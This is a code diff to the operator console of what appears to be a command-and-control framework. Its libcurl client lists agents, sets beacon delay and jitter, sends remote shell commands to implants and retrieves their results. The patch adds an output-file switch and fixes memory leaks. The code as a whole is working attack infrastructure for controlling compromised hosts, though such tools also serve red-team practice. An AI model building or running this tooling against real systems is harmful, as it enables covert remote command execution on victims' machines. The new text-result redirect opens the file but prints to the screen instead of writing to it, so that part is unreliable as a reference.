@@ -15,6 +15,7 @@
 
 #define SERVER_NAME_SIZE 256 //max size of <server-name/ip>:<port> and the null byte
 #define BUFSIZE 1024
+#define FILENAME_SIZE 256 // '\0' included
 #define PROMPT_STR "c2-server$ "
 #define PROMPT_STR_LIST "c2-server/list$ "
 
@@ -50,11 +51,11 @@ int control_agent_menu(CURL *curl, struct agent_info *agent, const char *base_ur
 int ping_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches);
 int conf_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches);
 int cmd_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches);
-int print_results(CURL *curl, const char *base_url, char *agent_id, char *task_id, int retries);
+int print_results(CURL *curl, char *filename, const char *base_url, char *agent_id, char *task_id, int retries);
 unsigned char *base64_decode(const unsigned char *data, size_t *outbytes, int *error);
 static inline void print_inv_cmd(void);
 static inline void print_help(int menu_state);
-static inline void trim_spaces(char **);
+static inline void trim_spaces(char **buf);
 int set_http_headers(struct curl_slist **slist_ptr, int argc, ...);
 size_t write_cb(char *data, size_t size, size_t nmemb, void *buf);
 
@@ -89,6 +90,7 @@ int main(void){
             rc = select_agent_menu(curl, agent, base_url);
             if (rc == -1) {
                 free(agent);
+                free(base_url);
                 curl_easy_cleanup(curl);
                 exit(EXIT_FAILURE);
             }
@@ -98,6 +100,7 @@ int main(void){
             rc = control_agent_menu(curl, agent, base_url);
             if (rc == -1) {
                 free(agent);
+                free(base_url);
                 curl_easy_cleanup(curl);
                 exit(EXIT_FAILURE);
             }
@@ -126,6 +129,7 @@ char *server_connect(CURL *curl) {
     rc_curl = curl_easy_perform(curl);
     if (rc_curl != CURLE_OK) {
         fprintf(stderr, "curl_easy_perform: %s\n", curl_easy_strerror(rc_curl));
+        free(url);
         return (void *)NULL;
     }
     curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
@@ -135,6 +139,7 @@ char *server_connect(CURL *curl) {
     if (http_code != 200) {
         fprintf(stderr, "failed: status code of 200 was expected\n");
         free(response_buf.response);
+        free(url);
         return (void *)NULL;
     }
     fwrite(response_buf.response, 1, response_buf.size, stdout);
@@ -170,11 +175,14 @@ static inline void print_help(int menu_state) {
             printf("\t-q: quiet, don't print the task result\n");
             //printf("\t-o: redirect the task result to an output file\n");
             printf("\tping: ping agent\n");
-            printf("\tconf [option]: configure agent\n");
-            printf("\t\tdelay [xx]s[xx]ns: set mean delay\n");
+            printf("\tconf [config]: configure agent\n");
+            printf("\t\tdelay [xx]s[xx]ns: set mean delay. ex.\n\t\t delay 5s0ns "
+                   "(both s and ns must be present)\n");
             printf("\t\tjitter [xx]s[xx]ns: set maximum jitter\n");
-            printf("\tcmd [command]: issue the agent a shell command. "
-                   "-q should come before the command.\n");
+            printf("\tcmd [command]: issue the agent a shell command.\n");
+            printf("\t\t-o [filename] redirect output to a binary file,\n\t\t use for commands that "
+                "expect a binary output.\n\t\t Using both -q and -o is invalid.\n");
+            printf("\t\t-q or -o come before the issued command\n");
             printf("results: see all completed tasks of this agent and their results\n");
             printf("\t-o: redirect to an output file (not implemented)\n");
             printf("back: go to previous menu\n");
@@ -245,7 +253,7 @@ int select_agent_menu(CURL *curl, struct agent_info *agent, const char *base_url
 
         else if (strncmp(buf, "results", 7) == 0) {
             //should add check for -o switch and output redirection
-            int rc = print_results(curl, base_url, (void *)NULL, (void *)NULL, 0); //agent_id and task_id
+            int rc = print_results(curl, (void *)NULL, base_url, (void *)NULL, (void *)NULL, 0); //agent_id and task_id
             if (rc == -1)
                 return rc; //main loop clean up and exit
             continue;
@@ -386,6 +394,7 @@ int control_agent_menu(CURL *curl, struct agent_info *agent, const char *base_ur
         if (strcmp(buf, "back") == 0) {
             free(agent->handle);
             free(agent->id);
+            free(prompt_str);
             memset(agent, 0, sizeof(struct agent_info));
             return 0;
         }
@@ -395,6 +404,7 @@ int control_agent_menu(CURL *curl, struct agent_info *agent, const char *base_ur
             if (rc == -1) {
                 free(agent->handle);
                 free(agent->id);
+                free(prompt_str);
                 return -1;
             }
             continue;
@@ -405,6 +415,7 @@ int control_agent_menu(CURL *curl, struct agent_info *agent, const char *base_ur
             if (rc == -1) {
                 free(agent->handle);
                 free(agent->id);
+                free(prompt_str);
                 return -1;
             }
             continue;
@@ -415,15 +426,17 @@ int control_agent_menu(CURL *curl, struct agent_info *agent, const char *base_ur
             if (rc == -1) {
                 free(agent->handle);
                 free(agent->id);
+                free(prompt_str);
                 return -1;
             }
             continue;
         }
         if (strncmp(buf, "results", 7) == 0) {
-            rc = print_results(curl, base_url, agent->id, (void *)NULL, 0);
+            rc = print_results(curl, (void *)NULL, base_url, agent->id, (void *)NULL, 0);
             if (rc == -1) {
                 free(agent->handle);
                 free(agent->id);
+                free(prompt_str);
                 return -1;
             }
             continue;
@@ -518,7 +531,9 @@ int ping_task(CURL *curl, struct agent_info *agent, const char *base_url, char *
         json_decref(root);
         return -1;
     }
-    return print_results(curl, base_url, (void *)NULL, task_id, req_retries);
+    int rc = print_results(curl, (void *) NULL, base_url, (void *)NULL, task_id, req_retries);
+    json_decref(root);
+    return rc;
 }
 
 int conf_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches) {
@@ -690,20 +705,53 @@ int conf_task(CURL *curl, struct agent_info *agent, const char *base_url, char *
         json_decref(root);
         return -1;
     }
-    return print_results(curl, base_url, (void *)NULL, task_id, req_retries);
+    int rc = print_results(curl, (void *)NULL, base_url, (void *)NULL, task_id, req_retries);
+    json_decref(root);
+    return rc;
 }
 
 int cmd_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches) {
     int quiet = 0;
+    char filename[FILENAME_SIZE] = {0};
     trim_spaces(&switches);
-    if (switches[0] == '-' && switches[1] == 'q') {
-        switches += 2; //skip -q
-        if (*switches != ' ' && *switches != '\t' && *switches != '\n') {
+    if (switches[0] == '-') {
+        if (switches[1] == 'q') {
+            switches += 2; //skip -q
+            if (*switches != ' ' && *switches != '\t' && *switches != '\n') {
+                print_inv_cmd();
+                return 0;
+            }
+            quiet = 1;
+            trim_spaces(&switches);
+        }
+        else if (switches[1] == 'o') {
+            switches += 2;
+            if (*switches != ' ' && *switches != '\t' && *switches != '\n') {
+                print_inv_cmd();
+                return 0;
+            }
+            //parse output file name
+            trim_spaces(&switches);
+            char *p = switches;
+            while (*p && *p != ' ' && *p != '\t' && *p != '\n') p++;
+            if (!*p) { //nothing left after the filename
+                print_inv_cmd();
+                return 0;
+            } //p points to the whitespace after the filename
+            size_t nbytes = p - switches;
+            if (nbytes >= sizeof(filename)) { // >= because we should add null-byte
+                printf("filename too large\n");
+                return 0;
+            }
+            memcpy(filename, switches, nbytes);
+            filename[nbytes] = '\0'; //done
+            switches = p;
+            trim_spaces(&switches); //switches will be pointing at the command string, if any
+        }
+        else {
             print_inv_cmd();
             return 0;
         }
-        quiet = 1;
-        trim_spaces(&switches);
     }
     if (*switches == '\0') {
         print_inv_cmd();
@@ -783,10 +831,16 @@ int cmd_task(CURL *curl, struct agent_info *agent, const char *base_url, char *s
         json_decref(root);
         return -1;
     }
-    return print_results(curl, base_url, (void *)NULL, task_id, req_retries);
+    int rc;
+    if (*filename)
+        rc = print_results(curl, filename, base_url, (void *)NULL, task_id, req_retries);
+    else
+        rc = print_results(curl, (void *)NULL, base_url, (void *)NULL, task_id, req_retries);
+    json_decref(root);
+    return rc;
 }
 
-int print_results(CURL *curl, const char *base_url, char *agent_id, char *task_id, int retries) {
+int print_results(CURL *curl, char *filename, const char *base_url, char *agent_id, char *task_id, int retries) {
     CURLcode rc_curl;
     long http_code;
     char *results_url;
@@ -839,13 +893,14 @@ int print_results(CURL *curl, const char *base_url, char *agent_id, char *task_i
             //we don't expect the task result to return immediately
             if (retries > 0) {
                 clock_nanosleep(CLOCK_MONOTONIC, 0, &req_wait, (void *)NULL);
-                return print_results(curl, base_url, agent_id, task_id, (retries - 1));
+                return print_results(curl, filename, base_url, agent_id, task_id, (retries - 1));
             } //else retries hits zero, we return empty
         }
         printf("list is empty: couldn't fetch result(s)\n");
         return 0;
     } //array isn't empty:
     printf("\n");
+    //open file, if it exists, decref array on failure
     size_t index;
     json_t *task_obj;
     json_array_foreach(res_arr, index, task_obj) {
@@ -892,12 +947,44 @@ int print_results(CURL *curl, const char *base_url, char *agent_id, char *task_i
                         }
                     }
                     else {
-                        fprintf(stdout, "result type: %s, result data:\n", type);
-                        fwrite(decode, outbytes, 1, stdout);
+                        if (filename) {
+                            fprintf(stdout, "result type: %s, result data "
+                                            "redirected to %s\n", type, filename);
+                            FILE *fs = fopen(filename, "ab");
+                            if (!fs) {
+                                fprintf(stdout, "couldn't open file.\n");
+                                json_decref(result_obj);
+                                json_decref(res_arr);
+                                free(decode);
+                                return 0;
+                            }
+                            fwrite(decode, outbytes, 1, fs);
+                            fclose(fs);
+                        }
+                        else { //no filename, writing to stdout
+                            fprintf(stdout, "result type: %s, result data:\n", type);
+                            fwrite(decode, outbytes, 1, stdout);
+                        }
+                        free(decode);
                     }
                 } //assuming type is text, not binary:
                 else {
-                    fprintf(stdout, "result type: %s, result data: %s\n", type, data);
+                    if (filename) {
+                        fprintf(stdout, "result type: %s, result data "
+                                            "redirected to %s\n", type, filename);
+                        FILE *fs = fopen(filename, "a");
+                        if (!fs) {
+                            fprintf(stdout, "couldn't open file.\n");
+                            json_decref(result_obj);
+                            json_decref(res_arr);
+                            return 0;
+                        }
+                        fprintf(stdout, "result type: %s, result data: %s\n", type, data);
+                        fclose(fs);
+                    }
+                    else { //no filename, writing to stdout
+                        fprintf(stdout, "result type: %s, result data: %s\n", type, data);
+                    }
                 }
             }
             else {
@@ -954,6 +1041,7 @@ int print_results(CURL *curl, const char *base_url, char *agent_id, char *task_i
                     else {
                         fprintf(stdout, "result type: %s, result data:\n", type);
                         fwrite(decode, outbytes, 1, stdout);
+                        free(decode);
                     }
                 } //assuming type is text, not binary:
                 else {
@@ -1015,6 +1103,7 @@ int print_results(CURL *curl, const char *base_url, char *agent_id, char *task_i
                     else {
                         fprintf(stdout, "result type: %s, result data:\n", type);
                         fwrite(decode, outbytes, 1, stdout);
+                        free(decode);
                     }
                 } //assuming type is text, not binary:
                 else {
